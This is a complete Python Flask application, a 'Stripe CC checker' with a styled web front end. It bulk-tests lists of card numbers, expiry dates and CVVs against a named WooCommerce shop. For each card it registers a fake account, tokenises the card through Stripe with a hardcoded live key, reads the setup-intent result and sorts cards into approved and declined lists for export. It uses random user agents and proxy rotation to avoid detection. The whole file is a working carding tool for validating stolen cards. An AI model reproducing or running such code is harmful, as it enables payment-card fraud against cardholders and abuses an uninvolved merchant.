from flask import Flask, render_template_string, request, jsonify, send_file
import asyncio
import httpx
import random
import string
import re
import json
import os
import threading
from datetime import datetime
from fake_useragent import UserAgent
from bs4 import BeautifulSoup
import base64
from io import StringIO, BytesIO
import csv

app = Flask(__name__)

# Enhanced HTML Template with Premium Design
HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>⚡ FIRE CC CHECKER - Stripe </title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Space Grotesk', sans-serif;
        }

        body {
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 50%, #0f1428 100%);
            min-height: 100vh;
            color: #fff;
            position: relative;
            overflow-x: hidden;
        }

        body::before {
            content: '';
            position: fixed;
            width: 300%;
            height: 300%;
            background: radial-gradient(circle at 20% 50%, rgba(255, 70, 85, 0.15) 0%, transparent 50%),
                        radial-gradient(circle at 80% 80%, rgba(100, 200, 255, 0.1) 0%, transparent 50%);
            animation: gradientShift 20s ease-in-out infinite;
            z-index: -1;
        }

        @keyframes gradientShift {
            0%, 100% { transform: translate(0, 0); }
            50% { transform: translate(-50px, -50px); }
        }

        .container {
            max-width: 1800px;
            margin: 0 auto;
            padding: 30px 20px;
        }

        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 30px 0;
            border-bottom: 2px solid rgba(255, 70, 85, 0.3);
            margin-bottom: 40px;
            flex-wrap: wrap;
            gap: 20px;
        }

        .logo {
            display: flex;
            align-items: center;
            gap: 20px;
        }

        .logo-icon {
            font-size: 56px;
            color: #ff4655;
            filter: drop-shadow(0 0 25px rgba(255, 70, 85, 0.6));
            animation: glow 2.5s ease-in-out infinite;
        }

        @keyframes glow {
            0%, 100% { filter: drop-shadow(0 0 25px rgba(255, 70, 85, 0.6)); }
            50% { filter: drop-shadow(0 0 50px rgba(255, 70, 85, 1)); }
        }

        .logo-text h1 {
            font-size: 42px;
            font-weight: 700;
            background: linear-gradient(135deg, #fff 0%, #ff4655 50%, #ff8a9b 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            letter-spacing: 3px;
        }

        .logo-text p {
            color: #8a8fbf;
            font-size: 14px;
            margin-top: 5px;
        }

        .stats {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }

        .stat-card {
            background: rgba(255, 255, 255, 0.08);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 70, 85, 0.3);
            border-radius: 20px;
            padding: 25px 35px;
            text-align: center;
            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
        }

        .stat-card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle, rgba(255, 70, 85, 0.3) 0%, transparent 70%);
            opacity: 0;
            transition: 0.6s;
        }

        .stat-card:hover::before {
            opacity: 1;
        }

        .stat-card:hover {
            transform: translateY(-8px) scale(1.05);
            border-color: #ff4655;
            box-shadow: 0 20px 50px rgba(255, 70, 85, 0.4);
        }

        .stat-value {
            font-size: 40px;
            font-weight: 700;
            color: #ff4655;
            margin-bottom: 8px;
        }

        .stat-label {
            color: #8a8fbf;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 2px;
            font-weight: 500;
        }

        .main-grid {
            display: grid;
            grid-template-columns: 1.3fr 0.7fr;
            gap: 30px;
            margin-bottom: 30px;
        }

        @media (max-width: 1200px) {
            .main-grid {
                grid-template-columns: 1fr;
            }
        }

        .card {
            background: rgba(20, 22, 45, 0.9);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 70, 85, 0.2);
            border-radius: 30px;
            padding: 30px;
            transition: all 0.4s ease;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .card:hover {
            border-color: #ff4655;
            box-shadow: 0 15px 50px rgba(255, 70, 85, 0.25);
            transform: translateY(-5px);
        }

        .card-title {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            margin-bottom: 25px;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .card-title i {
            color: #ff4655;
            font-size: 28px;
        }

        .input-group {
            margin-bottom: 25px;
        }

        .input-label {
            display: block;
            color: #8a8fbf;
            font-size: 14px;
            margin-bottom: 10px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .input-field {
            width: 100%;
            background: rgba(0, 0, 0, 0.4);
            border: 2px solid rgba(255, 70, 85, 0.2);
            border-radius: 15px;
            padding: 16px 18px;
            color: #fff;
            font-size: 14px;
            transition: all 0.3s ease;
        }

        .input-field:focus {
            outline: none;
            border-color: #ff4655;
            box-shadow: 0 0 30px rgba(255, 70, 85, 0.4);
            background: rgba(0, 0, 0, 0.5);
        }

        textarea.input-field {
            min-height: 220px;
            resize: vertical;
            font-family: 'Monaco', 'Menlo', monospace;
        }

        .file-upload {
            position: relative;
            display: inline-block;
            width: 100%;
            margin-bottom: 15px;
        }

        .file-upload input[type="file"] {
            display: none;
        }

        .file-upload-label {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            background: rgba(255, 70, 85, 0.1);
            border: 2px dashed rgba(255, 70, 85, 0.4);
            border-radius: 15px;
            padding: 20px;
            cursor: pointer;
            transition: all 0.3s ease;
            color: #ff4655;
            font-weight: 600;
        }

        .file-upload-label:hover {
            background: rgba(255, 70, 85, 0.2);
            border-color: #ff4655;
        }

        .button-group {
            display: flex;
            gap: 12px;
            flex-wrap: wrap;
            margin-top: 25px;
        }

        .btn {
            background: linear-gradient(135deg, #ff4655 0%, #ff6b81 100%);
            border: none;
            border-radius: 15px;
            padding: 16px 32px;
            color: #fff;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.4s ease;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            border: 2px solid transparent;
            box-shadow: 0 10px 30px rgba(255, 70, 85, 0.3);
        }

        .btn:hover {
            transform: translateY(-4px);
            box-shadow: 0 15px 40px rgba(255, 70, 85, 0.5);
            border-color: #fff;
        }

        .btn:active {
            transform: translateY(-2px);
        }

        .btn-outline {
            background: transparent;
            border: 2px solid #ff4655;
            color: #ff4655;
            box-shadow: none;
        }

        .btn-outline:hover {
            background: #ff4655;
            color: #fff;
        }

        .progress-bar {
            width: 100%;
            height: 8px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            overflow: hidden;
            margin-top: 20px;
            border: 1px solid rgba(255, 70, 85, 0.2);
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #ff4655 0%, #ff8a9b 100%);
            width: 0%;
            transition: width 0.3s ease;
            box-shadow: 0 0 20px rgba(255, 70, 85, 0.6);
        }

        .results-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 30px;
            margin-top: 30px;
        }

        @media (max-width: 1200px) {
            .results-container {
                grid-template-columns: 1fr;
            }
        }

        .results-box {
            background: rgba(20, 22, 45, 0.9);
            backdrop-filter: blur(15px);
            border: 1px solid rgba(255, 70, 85, 0.2);
            border-radius: 30px;
            overflow: hidden;
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
        }

        .results-header {
            padding: 25px;
            background: linear-gradient(135deg, rgba(255, 70, 85, 0.15) 0%, rgba(255, 70, 85, 0.05) 100%);
            border-bottom: 2px solid #ff4655;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }

        .results-header h3 {
            font-size: 20px;
            font-weight: 700;
            color: #fff;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .results-header i {
            font-size: 26px;
        }

        .results-actions {
            display: flex;
            gap: 8px;
        }

        .results-actions .btn-small {
            padding: 8px 14px;
            font-size: 13px;
            border-radius: 10px;
        }

        .results-content {
            padding: 20px;
            max-height: 600px;
            overflow-y: auto;
        }

        .results-content::-webkit-scrollbar {
            width: 8px;
        }

        .results-content::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.2);
            border-radius: 10px;
        }

        .results-content::-webkit-scrollbar-thumb {
            background: rgba(255, 70, 85, 0.5);
            border-radius: 10px;
        }

        .results-content::-webkit-scrollbar-thumb:hover {
            background: rgba(255, 70, 85, 0.8);
        }

        .result-item {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 70, 85, 0.1);
            border-radius: 12px;
            padding: 14px;
            margin-bottom: 12px;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 13px;
            transition: all 0.3s ease;
            word-break: break-all;
        }

        .result-item:hover {
            background: rgba(0, 0, 0, 0.5);
            transform: translateX(5px);
        }

        .result-item.approved {
            border-left: 4px solid #4caf50;
            background: rgba(76, 175, 80, 0.12);
        }

        .result-item.declined {
            border-left: 4px solid #ff4655;
            background: rgba(255, 70, 85, 0.12);
        }

        .result-item.unknown {
            border-left: 4px solid #ffc107;
            background: rgba(255, 193, 7, 0.12);
        }

        .bin-info {
            display: inline-block;
            background: rgba(255, 70, 85, 0.25);
            border-radius: 6px;
            padding: 3px 10px;
            margin-left: 8px;
            font-size: 11px;
            font-weight: 600;
            color: #ff8a9b;
        }

        .status-badge {
            display: inline-block;
            padding: 4px 12px;
            border-radius: 20px;
            font-size: 11px;
            font-weight: 700;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .status-badge.approved {
            background: rgba(76, 175, 80, 0.3);
            color: #4caf50;
        }

        .status-badge.declined {
            background: rgba(255, 70, 85, 0.3);
            color: #ff4655;
        }

        .empty-state {
            text-align: center;
            padding: 40px 20px;
            color: #8a8fbf;
        }

        .empty-state i {
            font-size: 48px;
            margin-bottom: 15px;
            opacity: 0.5;
        }

        .loading-spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 70, 85, 0.3);
            border-top-color: #ff4655;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .toast {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(20, 22, 45, 0.95);
            border: 1px solid rgba(255, 70, 85, 0.5);
            border-radius: 15px;
            padding: 16px 24px;
            color: #fff;
            z-index: 1000;
            animation: slideIn 0.3s ease;
        }

        @keyframes slideIn {
            from {
                transform: translateX(400px);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <div class="logo-icon">
                    <i class="fas fa-bolt"></i>
                </div>
                <div class="logo-text">
                    <h1>STRIPE cc check</h1>
                    <p>⚡ FIRE CC CHECKER - Stripe </p>
                </div>
            </div>
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-value" id="approvedCount">0</div>
                    <div class="stat-label">Approved</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="declinedCount">0</div>
                    <div class="stat-label">Declined</div>
                </div>
                <div class="stat-card">
                    <div class="stat-value" id="totalCount">0</div>
                    <div class="stat-label">Total Checked</div>
                </div>
            </div>
        </div>

        <div class="main-grid">
            <div class="card">
                <div class="card-title">
                    <i class="fas fa-credit-card"></i>
                    Card Input
                </div>
                
                <div class="input-group">
                    <label class="input-label">Upload Card List (TXT/CSV)</label>
                    <div class="file-upload">
                        <input type="file" id="fileInput" accept=".txt,.csv" onchange="handleFileUpload(this)">
                        <label for="fileInput" class="file-upload-label">
                            <i class="fas fa-cloud-upload-alt"></i>
                            Click to upload or drag and drop
                        </label>
                    </div>
                </div>

                <div class="input-group">
                    <label class="input-label">Or Paste Cards Here (CC|MM|YY|CVV)</label>
                    <textarea class="input-field" id="cards" placeholder="5555555555554444|12|25|123&#10;4111111111111111|01|26|456"></textarea>
                </div>

                <div class="input-group">
                    <label class="input-label">Proxy List (Optional - IP:PORT:USER:PASS)</label>
                    <textarea class="input-field" id="proxies" placeholder="192.168.1.1:8080:user:pass&#10;10.0.0.1:3128:admin:password"></textarea>
                </div>

                <div class="button-group">
                    <button class="btn" onclick="startCheck()">
                        <i class="fas fa-play"></i> Start Checking
                    </button>
                    <button class="btn btn-outline" onclick="stopCheck()">
                        <i class="fas fa-stop"></i> Stop
                    </button>
                    <button class="btn btn-outline" onclick="clearAll()">
                        <i class="fas fa-trash"></i> Clear All
                    </button>
                </div>

                <div class="progress-bar">
                    <div class="progress-fill" id="progress"></div>
                </div>
            </div>

            <div class="card">
                <div class="card-title">
                    <i class="fas fa-info-circle"></i>
                    Information
                </div>
                
                <div style="color: #8a8fbf; line-height: 1.8; font-size: 14px;">
                    <p style="margin-bottom: 15px;">
                        <strong style="color: #fff;">Format Required:</strong><br>
                        CC|MM|YY|CVV
                    </p>
                    <p style="margin-bottom: 15px;">
                        <strong style="color: #fff;">Example:</strong><br>
                        5555555555554444|12|25|123
                    </p>
                    <p style="margin-bottom: 15px;">
                        <strong style="color: #fff;">Supported:</strong><br>
                        • Visa<br>
                        • Mastercard<br>
                        • American Express<br>
                    </p>
                    <p>
                        <strong style="color: #fff;">Status:</strong><br>
                        <span style="color: #4caf50;">✓ Online</span>
                    </p>
                </div>
            </div>
        </div>

        <div class="results-container">
            <div class="results-box">
                <div class="results-header">
                    <h3>
                        <i class="fas fa-check-circle" style="color:#4caf50"></i>
                        Approved Cards
                    </h3>
                    <div class="results-actions">
                        <button class="btn btn-outline btn-small" onclick="copyApproved()" title="Copy to clipboard">
                            <i class="fas fa-copy"></i>
                        </button>
                        <button class="btn btn-outline btn-small" onclick="downloadApproved()" title="Download">
                            <i class="fas fa-download"></i>
                        </button>
                    </div>
                </div>
                <div class="results-content" id="approvedList">
                    <div class="empty-state">
                        <i class="fas fa-inbox"></i>
                        <p>No approved cards yet</p>
                    </div>
                </div>
            </div>

            <div class="results-box">
                <div class="results-header">
                    <h3>
                        <i class="fas fa-times-circle" style="color:#ff4655"></i>
                        Declined Cards
                    </h3>
                    <div class="results-actions">
                        <button class="btn btn-outline btn-small" onclick="copyDeclined()" title="Copy to clipboard">
                            <i class="fas fa-copy"></i>
                        </button>
                        <button class="btn btn-outline btn-small" onclick="downloadDeclined()" title="Download">
                            <i class="fas fa-download"></i>
                        </button>
                    </div>
                </div>
                <div class="results-content" id="declinedList">
                    <div class="empty-state">
                        <i class="fas fa-inbox"></i>
                        <p>No declined cards yet</p>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let checking = false;
        let approvedCards = [];
        let declinedCards = [];
        let currentIndex = 0;

        function showToast(message, type = 'info') {
            const toast = document.createElement('div');
            toast.className = 'toast';
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }

        function handleFileUpload(input) {
            const file = input.files[0];
            if (!file) return;
            
            const reader = new FileReader();
            reader.onload = function(e) {
                document.getElementById('cards').value = e.target.result;
                showToast('File loaded successfully', 'success');
            };
            reader.onerror = function() {
                showToast('Error reading file', 'error');
            };
            reader.readAsText(file);
        }

        async function checkCard(card, proxy) {
            try {
                const response = await fetch('/check', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({card: card, proxy: proxy})
                });
                return await response.json();
            } catch (error) {
                return {result: 'Error - Connection failed'};
            }
        }

        async function startCheck() {
            if (checking) {
                showToast('Already checking...', 'info');
                return;
            }
            
            const cardsText = document.getElementById('cards').value.trim();
            if (!cardsText) {
                showToast('Please enter cards to check', 'error');
                return;
            }

            const proxiesText = document.getElementById('proxies').value.trim();
            const cards = cardsText.split('\\n').filter(c => c.trim());
            
            if (cards.length > 1500) {
                showToast('Maximum 1500 cards allowed', 'error');
                return;
            }

            checking = true;
            approvedCards = [];
            declinedCards = [];
            currentIndex = 0;

            document.getElementById('approvedList').innerHTML = '';
            document.getElementById('declinedList').innerHTML = '';

            for (let i = 0; i < cards.length && checking; i++) {
                currentIndex = i + 1;
                document.getElementById('progress').style.width = 
                    (currentIndex / cards.length * 100) + '%';

                const result = await checkCard(cards[i], proxiesText);
                
                const binInfo = cards[i].split('|')[0].substring(0, 6);
                const cardInfo = {
                    card: cards[i],
                    result: result.result,
                    bin: binInfo
                };

                if (result.result.includes('Approved')) {
                    approvedCards.push(cardInfo);
                    addToResults('approvedList', cardInfo, 'approved');
                } else {
                    declinedCards.push(cardInfo);
                    addToResults('declinedList', cardInfo, 'declined');
                }

                updateStats();
                await new Promise(r => setTimeout(r, 500));
            }

            checking = false;
            showToast('Checking complete!', 'success');
        }

        function addToResults(listId, cardInfo, type) {
            const list = document.getElementById(listId);
            
            if (list.querySelector('.empty-state')) {
                list.innerHTML = '';
            }

            const div = document.createElement('div');
            div.className = `result-item ${type}`;
            
            const statusClass = type === 'approved' ? 'approved' : 'declined';
            const statusText = type === 'approved' ? 'APPROVED' : 'DECLINED';
            
            div.innerHTML = `
                <div style="display: flex; justify-content: space-between; align-items: start; gap: 10px;">
                    <div style="flex: 1;">
                        <div style="color: #fff; margin-bottom: 6px; font-weight: 600;">${cardInfo.card}</div>
                        <div style="color: #8a8fbf; font-size: 12px;">
                            ${cardInfo.result}
                            <span class="bin-info">BIN: ${cardInfo.bin}</span>
                        </div>
                    </div>
                    <span class="status-badge ${statusClass}">${statusText}</span>
                </div>
            `;
            list.appendChild(div);
            list.scrollTop = list.scrollHeight;
        }

        function updateStats() {
            document.getElementById('approvedCount').textContent = approvedCards.length;
            document.getElementById('declinedCount').textContent = declinedCards.length;
            document.getElementById('totalCount').textContent = 
                approvedCards.length + declinedCards.length;
        }

        function stopCheck() {
            checking = false;
            showToast('Checking stopped', 'info');
        }

        function clearAll() {
            document.getElementById('cards').value = '';
            document.getElementById('proxies').value = '';
            document.getElementById('approvedList').innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No approved cards yet</p></div>';
            document.getElementById('declinedList').innerHTML = '<div class="empty-state"><i class="fas fa-inbox"></i><p>No declined cards yet</p></div>';
            approvedCards = [];
            declinedCards = [];
            currentIndex = 0;
            updateStats();
            document.getElementById('progress').style.width = '0%';
            showToast('All data cleared', 'info');
        }

        function copyApproved() {
            if (approvedCards.length === 0) {
                showToast('No approved cards to copy', 'error');
                return;
            }
            const text = approvedCards.map(c => c.card).join('\\n');
            navigator.clipboard.writeText(text).then(() => {
                showToast('Approved cards copied!', 'success');
            });
        }

        function copyDeclined() {
            if (declinedCards.length === 0) {
                showToast('No declined cards to copy', 'error');
                return;
            }
            const text = declinedCards.map(c => c.card + ' - ' + c.result).join('\\n');
            navigator.clipboard.writeText(text).then(() => {
                showToast('Declined cards copied!', 'success');
            });
        }

        function downloadApproved() {
            if (approvedCards.length === 0) {
                showToast('No approved cards to download', 'error');
                return;
            }
            const text = approvedCards.map(c => c.card + ' | ' + c.result + ' | BIN: ' + c.bin).join('\\n');
            const blob = new Blob([text], {type: 'text/plain'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'approved_cards_' + new Date().getTime() + '.txt';
            a.click();
            URL.revokeObjectURL(url);
            showToast('File downloaded!', 'success');
        }

        function downloadDeclined() {
            if (declinedCards.length === 0) {
                showToast('No declined cards to download', 'error');
                return;
            }
            const text = declinedCards.map(c => c.card + ' | ' + c.result + ' | BIN: ' + c.bin).join('\\n');
            const blob = new Blob([text], {type: 'text/plain'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'declined_cards_' + new Date().getTime() + '.txt';
            a.click();
            URL.revokeObjectURL(url);
            showToast('File downloaded!', 'success');
        }

        // Initialize stats
        updateStats();
    </script>
</body>
</html>
'''

class WooStripeChecker:
    def __init__(self):
        self.client = None
        self.session_data = {}
    
    async def __aenter__(self):
        return self
    
    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.client:
            await self.client.aclose()
    
    def set_proxy(self, proxy_string):
        try:
            if not proxy_string:
                self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
                return
                
            parts = proxy_string.split(':')
            if len(parts) == 4:
                ip, port, user, pw = parts
                proxy_url = f"http://{user}:{pw}@{ip}:{port}"
                self.client = httpx.AsyncClient(
                    proxies={"http://": proxy_url, "https://": proxy_url},
                    timeout=30,
                    follow_redirects=True
                )
            else:
                self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)
        except Exception as e:
            print(f"Proxy error: {e}")
            self.client = httpx.AsyncClient(timeout=30, follow_redirects=True)

    async def get_nonce(self, ho):
        try:
            r = await self.client.get(f'https://{ho}/my-account/')
            soup = BeautifulSoup(r.text, 'html.parser')
            nonce_input = soup.find('input', {'name': 'woocommerce-register-nonce'})
            return nonce_input.get('value') if nonce_input else None
        except Exception as e:
            print(f"Get nonce error: {e}")
            return None

    async def register(self, nonce, ho):
        user = ''.join(random.choices(string.ascii_lowercase, k=8))
        rand_num = random.randint(100, 999)
        username = f'User{user}{rand_num}'
        email = f'user_{user}{rand_num}@gmail.com'
        password = f'Pass{user}@#$%^!'
        
        data = {
            'username': username,
            'email': email,
            'password': password,
            'woocommerce-register-nonce': nonce,
            'register': 'Register',
            '_wp_http_referer': '/my-account/'
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': f'https://{ho}',
            'Referer': f'https://{ho}/my-account/'
        }
        
        try:
            r = await self.client.post(
                f'https://{ho}/my-account/',
                data=data,
                headers=headers
            )
            
            if "Log out" in r.text or "logout" in r.text.lower():
                self.session_data['username'] = username
                self.session_data['email'] = email
                self.session_data['password'] = password
                return True
            return False
        except Exception as e:
            print(f"Register error: {e}")
            return False

    async def get_ajax_nonce(self, ho):
        try:
            r = await self.client.get(f'https://{ho}/my-account/add-payment-method/')
            
            patterns = [
                r'"create_setup_intent_nonce":"([^"]+)"',
                r'"createAndConfirmSetupIntentNonce":"([^"]+)"',
                r'"createSetupIntentNonce":"([^"]+)"'
            ]
            
            for p in patterns:
                match = re.search(p, r.text)
                if match:
                    return match.group(1)
            return None
        except Exception as e:
            print(f"Get ajax nonce error: {e}")
            return None

    async def get_stripe_token(self, cc, mm, yy, cvv):
        headers = {
            'origin': 'https://js.stripe.com',
            'referer': 'https://js.stripe.com/',
            'content-type': 'application/x-www-form-urlencoded'
        }
        
        if len(yy) == 2:
            yy = f'20{yy}'
        
        payload = f'type=card&card[number]={cc}&card[cvc]={cvv}&card[exp_year]={yy}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=US&payment_user_agent=stripe.js%2Fc3ec434e35%3B+stripe-js-v3%2Fc3ec434e35&key=pk_live_PuSTzLYx1z0E6f7fk5b5KZRK00Jc2i4Ngr'
        
        try:
            r = await self.client.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=headers,
                content=payload.encode('utf-8')
            )
            
            j = r.json()
            
            if 'id' in j:
                return j['id'], None
            
            err = j.get('error', {}).get('message', 'Token Error')
            return None, err
            
        except Exception as e:
            return None, str(e)

    async def check_card(self, payment_id, ajax_nonce, ho):
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'Referer': f'https://{ho}/my-account/add-payment-method/',
            'Origin': f'https://{ho}',
            'X-Requested-With': 'XMLHttpRequest'
        }

        try:
            r = await self.client.post(
                f'https://{ho}/wp-admin/admin-ajax.php',
                headers=headers,
                data=data
            )
            
            txt = r.text
            
            if re.search(r'succeeded', txt, re.I):
                return "Approved - Card is valid"
            elif re.search(r'declined', txt, re.I):
                return "Declined - Card declined"
            elif re.search(r'insufficient_funds', txt, re.I):
                return "Declined - Insufficient Funds"
            elif re.search(r'incorrect_cvc', txt, re.I):
                return "Declined - Incorrect CVC"
            elif re.search(r'expired_card', txt, re.I):
                return "Declined - Expired Card"
            elif re.search(r'requires_action', txt, re.I):
                return "3DS Required - Card needs authentication"
            elif re.search(r'stolen_card', txt, re.I):
                return "Declined - Stolen Card"
            elif re.search(r'lost_card', txt, re.I):
                return "Declined - Lost Card"
            else:
                return "Unknown - Check failed"
                
        except Exception as e:
            return f"Error - {str(e)}"

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    card = data.get('card', '')
    proxy_string = data.get('proxy', '')
    ho = "girlslivingwell.com"
    
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return jsonify({'result': 'Error - Invalid card format'})
        
        cc_num, mm, yy, cvv = parts
        
        # Run async function in event loop
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        result = loop.run_until_complete(check_card_async(cc_num, mm, yy, cvv, proxy_string, ho))
        loop.close()
        
        return jsonify({'result': result})
        
    except Exception as e:
        return jsonify({'result': f'Error - {str(e)}'})

async def check_card_async(cc_num, mm, yy, cvv, proxy_string, ho):
    try:
        usr = UserAgent()
        headers = {
            'Connection': 'keep-alive',
            'User-Agent': usr.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
        }
        
        async with WooStripeChecker() as checker:
            checker.client = httpx.AsyncClient(
                headers=headers,
                timeout=30,
                follow_redirects=True
            )
            
            checker.set_proxy(proxy_string)
            
            nonce = await checker.get_nonce(ho)
            if not nonce:
                return 'Failed - Cannot get nonce'
            
            reg = await checker.register(nonce, ho)
            if not reg:
                return 'Failed - Registration error'
            
            ajax_nonce = await checker.get_ajax_nonce(ho)
            if not ajax_nonce:
                return 'Failed - Cannot get ajax nonce'
            
            token, err = await checker.get_stripe_token(cc_num, mm, yy, cvv)
            if err:
                return f'Failed - {err}'
            
            result = await checker.check_card(token, ajax_nonce, ho)
            
            return result
        
    except Exception as e:
        return f'Error - {str(e)}'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
